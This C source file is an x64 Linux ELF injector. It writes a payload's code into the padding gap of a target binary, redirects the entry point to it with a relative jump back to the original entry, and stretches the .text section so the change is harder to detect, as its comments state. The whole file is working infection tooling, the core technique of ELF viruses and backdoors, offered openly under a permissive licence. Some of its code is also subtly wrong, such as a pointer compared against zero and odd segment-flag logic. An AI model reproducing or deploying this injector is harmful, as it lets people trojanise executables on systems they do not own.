/**
 * Author: Robert Hendriks
 * Version: 0.1
 * Description: An ELF injector for linux x64
 * TODO:
 * 		- Add x86 support
 * 		- Add marker for already injected files
 * 		- Check for valid ELF header
 *
 *	Features:
 *		- Uses a relative jump towards OEP (compatible with ASLR)
 *		- Stretch the .text section to prevent EP outside of section
 *
 *	Based on a tutorial about ELF injection to be found here: https://0x00sec.org/t/elfun-file-injector/410
 *
 * Copyright 2018
 *
	Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 *
 */

#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

int open_and_map_elf(char *fname, char **data, uint8_t write_back){
  //Open the file
  FILE* fd = fopen(fname, "a+");
  if(fd < 0){
    perror("Opening file: ");
    return -1;
  }
  
  //Get size of the file
  fseek(fd, 0, SEEK_END);
  int len = ftell(fd);
  rewind(fd);

  //Map the file into memory
  if(write_back){
    *data = mmap(0, len, PROT_READ|PROT_WRITE, MAP_SHARED, fileno(fd), 0);
  } else {
    *data = mmap(0, len, PROT_READ|PROT_WRITE, MAP_PRIVATE, fileno(fd), 0);
  }

  if(*data == MAP_FAILED){
    perror("mmap:");
    fclose(fd);
    return -1;
  }

  return fileno(fd);
}

Elf64_Phdr* find_elf_gap(char *data, Elf64_Ehdr* elf_header, long *gap_offset, long *gap_size){
  //Find loadable & executable segment
  Elf64_Phdr* program_header = (Elf64_Phdr*)&data[elf_header->e_phoff];
  Elf64_Phdr* code_segment = NULL;
  Elf64_Phdr* next_segment = NULL;
  for(int i = 0; i < elf_header->e_phnum; i++){
    if(program_header->p_type == PT_LOAD && program_header->p_flags & 0x011){
      code_segment = program_header;
      next_segment = (Elf64_Phdr*)&data[elf_header->e_phoff + (elf_header->e_phentsize * i)];
      break;    
    }
    program_header = (Elf64_Phdr*)&data[elf_header->e_phoff + (elf_header->e_phentsize * i)];
  }

  if(!code_segment || !next_segment){
    printf("[-] Error couldnt find code segment or the next segment\n");
  }

  *gap_offset = code_segment->p_offset + code_segment->p_filesz;
  *gap_size = next_segment->p_offset - *gap_offset;

  printf("[+] Gap found at 0x%x (%d bytes available)\n", *gap_offset, *gap_size);
  return code_segment;
}


Elf64_Shdr *
elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
  Elf64_Shdr *sh_strtab = &shdr[elf_hdr->e_shstrndx];
  const char *const sh_strtab_p = data + sh_strtab->sh_offset;
 
  for (i = 0; i < elf_hdr->e_shnum; i++)
    {
      sname = (char*) (sh_strtab_p + shdr[i].sh_name);
      if (!strcmp (sname, name))  return &shdr[i];
    }
  
  return NULL;
}

int main (int argc, char **argv){
  char *data = NULL;
  int fd = open_and_map_elf(argv[1], &data, 1);

  Elf64_Ehdr *elf_hdr = (Elf64_Ehdr *) data;
  printf("[+] Entry point: %p\n", (void*) elf_hdr->e_entry);

  //Find an gap
  long gap_offset = 0;
  long gap_size = 0;
  Elf64_Phdr *code_segment = find_elf_gap(data, elf_hdr, &gap_offset, &gap_size);

  char *payload_data = NULL;
  int payload_fd = open_and_map_elf(argv[2], &payload_data, 0);

  Elf64_Shdr *payload_text_section = elfi_find_section(payload_data, ".text");
  printf("[+] Size of payload is %d bytes\n", payload_text_section->sh_size);

  if(payload_text_section->sh_size > gap_size){
    printf("[-] Gap size to small for payload!\n");
    exit(1);
  }


  //Find NOPs inside payload
  uint32_t nop_offset = 0;
  for(uint32_t i = 0; i < payload_text_section->sh_size; i++){
    if((uint8_t)payload_data[payload_text_section->sh_offset + i] == 0x90){
      nop_offset = payload_text_section->sh_offset + i;
      break;
    }
  }

  //Check if NOPs are found
  if(nop_offset == 0){
	printf("[-] NOPs not found inside payload, are they present?\n");
	return 0;
  }

  //Calc offset to org_ep  
  uint16_t offset_to_start_of_payload = (nop_offset - payload_text_section->sh_offset) + 5; //Plus 5 because the jmp and the 4 bytes for the address are together 5 bytes
  uint32_t offset_to_org_ep = (gap_offset - elf_hdr->e_entry) + offset_to_start_of_payload;

  //Offset_to_org_ep is the number of bytes we need to jump, however we need to jump back since we injected at the end of .text section
  //So convert the offset to a negative number first (-1 because 0 is seen as a positive number)
  uint32_t jmp_value = (offset_to_org_ep - 1) ^ 0xFFFFFFFF;

  //Inject an long relative JMP
  //Store little endian jump value
  payload_data[nop_offset] = 0xE9;
  payload_data[nop_offset + 1] = (uint8_t)(jmp_value>>0);
  payload_data[nop_offset + 2] = (uint8_t)(jmp_value>>8);
  payload_data[nop_offset + 3] = (uint8_t)(jmp_value>>16);
  payload_data[nop_offset + 4] = (uint8_t)(jmp_value>>24);

  //Copy payload to target
  memmove(&data[gap_offset], &payload_data[payload_text_section->sh_offset], payload_text_section->sh_size); 
  elf_hdr->e_entry = (Elf64_Addr) gap_offset;

  //Stretching is done to prevent a signature where the EP is outside of the .text section (or any section for that matter)
  //Stretch code segment to include injected code
  code_segment->p_filesz += payload_text_section->sh_size;
  code_segment->p_memsz += payload_text_section->sh_size;

  //Stretch .text section 
  Elf64_Shdr *text_section = elfi_find_section(data, ".text"); 
  text_section->sh_size += payload_text_section->sh_size; 


  printf("[+] New entrypoint at 0x%x\n", gap_offset); 

  close(fd);
  close(payload_fd);

  return 0;
}
